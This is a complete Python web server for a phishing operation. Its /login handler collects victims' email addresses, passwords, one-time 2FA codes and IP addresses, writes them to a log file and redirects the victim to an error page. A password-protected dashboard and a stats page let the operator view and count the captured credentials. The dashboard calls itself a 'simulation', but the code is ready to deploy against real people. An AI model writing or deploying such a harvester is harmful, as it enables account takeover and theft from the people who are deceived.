#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
from datetime import datetime
import os

DASHBOARD_PASSWORD = "phishing@10$"

class Handler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        # Main page
        if self.path == '/' or self.path == '/index.html':
            self.serve_file('index.html')
        
        # Error/success page
        elif self.path == '/error.html':
            self.serve_file('error.html')
        
        # Dashboard
        elif self.path.startswith('/dashboard'):
            self.serve_dashboard()
        
        # Statistics
        elif self.path.startswith('/stats'):
            self.serve_stats()
        
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Page not found')
    
    def serve_file(self, filename):
        try:
            with open(filename, 'rb') as f:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(f.read())
        except FileNotFoundError:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'File not found')
    
    def serve_dashboard(self):
        # Check password
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        
        if params.get('pass', [''])[0] != DASHBOARD_PASSWORD:
            self.send_response(401)
            self.end_headers()
            self.wfile.write(b'Unauthorized. Use ?pass=phishing@10$')
            return
        
        # Read captured credentials
        captured_data = ""
        if os.path.exists('captured_log.txt'):
            with open('captured_log.txt', 'r') as f:
                captured_data = f.read()
        
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Phishing Dashboard</title>
            <style>
                body {{ background: #0a0e27; color: #00ff00; font-family: monospace; padding: 20px; }}
                .card {{ background: #1a1f3a; padding: 20px; margin: 10px 0; border-radius: 8px; }}
                pre {{ background: #0d1127; padding: 15px; overflow-x: auto; }}
                button {{ background: #00ff00; color: #0a0e27; padding: 10px; cursor: pointer; }}
            </style>
        </head>
        <body>
            <h1>🔐 Phishing Simulation Dashboard</h1>
            <div class="card">
                <h2>📋 Captured Credentials</h2>
                <pre>{captured_data if captured_data else 'No credentials captured yet...'}</pre>
            </div>
            <div class="card">
                <form action="/clear_logs" method="POST">
                    <input type="hidden" name="pass" value="{DASHBOARD_PASSWORD}">
                    <button type="submit" onclick="return confirm('Clear all logs?')">🗑️ Clear All Logs</button>
                </form>
            </div>
            <p><a href="/">🏠 Home</a> | <a href="/stats?pass={DASHBOARD_PASSWORD}">📊 Statistics</a></p>
        </body>
        </html>
        """
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def serve_stats(self):
        # Check password
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        
        if params.get('pass', [''])[0] != DASHBOARD_PASSWORD:
            self.send_response(401)
            self.end_headers()
            self.wfile.write(b'Unauthorized. Use ?pass=phishing@10$')
            return
        
        # Count attempts
        total = 0
        if os.path.exists('captured_log.txt'):
            with open('captured_log.txt', 'r') as f:
                total = len(f.readlines())
        
        html = f"""
        <!DOCTYPE html>
        <html>
        <head><title>Statistics</title>
        <style>
            body {{ background: #0a0e27; color: #00ff00; font-family: monospace; padding: 20px; }}
            .number {{ font-size: 48px; color: #4a90e2; }}
        </style>
        </head>
        <body>
            <h1>📊 Statistics</h1>
            <div class="number">{total}</div>
            <p>Total Login Attempts</p>
            <p><a href="/dashboard?pass={DASHBOARD_PASSWORD}">← Back to Dashboard</a></p>
        </body>
        </html>
        """
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def do_POST(self):
        if self.path == '/login':
            length = int(self.headers['Content-Length'])
            data = self.rfile.read(length)
            parsed = urllib.parse.parse_qs(data.decode())
            
            email = parsed.get('email', [''])[0]
            password = parsed.get('password', [''])[0]
            totp = parsed.get('totp', [''])[0]
            ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Save to file
            with open('captured_log.txt', 'a') as f:
                f.write(f"[{timestamp}] IP: {ip} | Email: {email} | Password: {password} | 2FA: {totp}\n")
            
            print(f"\n[!] CREDENTIALS CAPTURED")
            print(f"Email: {email}")
            print(f"Password: {password}")
            print(f"IP: {ip}")
            
            self.send_response(302)
            self.send_header('Location', '/error.html')
            self.end_headers()
        
        elif self.path == '/clear_logs':
            # Check password
            length = int(self.headers['Content-Length'])
            data = self.rfile.read(length)
            parsed = urllib.parse.parse_qs(data.decode())
            
            if parsed.get('pass', [''])[0] != DASHBOARD_PASSWORD:
                self.send_response(401)
                self.end_headers()
                return
            
            if os.path.exists('captured_log.txt'):
                os.remove('captured_log.txt')
            
            self.send_response(302)
            self.send_header('Location', '/dashboard?pass=' + DASHBOARD_PASSWORD)
            self.end_headers()
        
        else:
            self.send_response(404)
            self.end_headers()

def run():
    port = int(os.environ.get('PORT', 5000))
    httpd = HTTPServer(('0.0.0.0', port), Handler)
    print(f"Server running on port {port}")
    print(f"Dashboard: /dashboard?pass={DASHBOARD_PASSWORD}")
    httpd.serve_forever()

if __name__ == '__main__':
    run()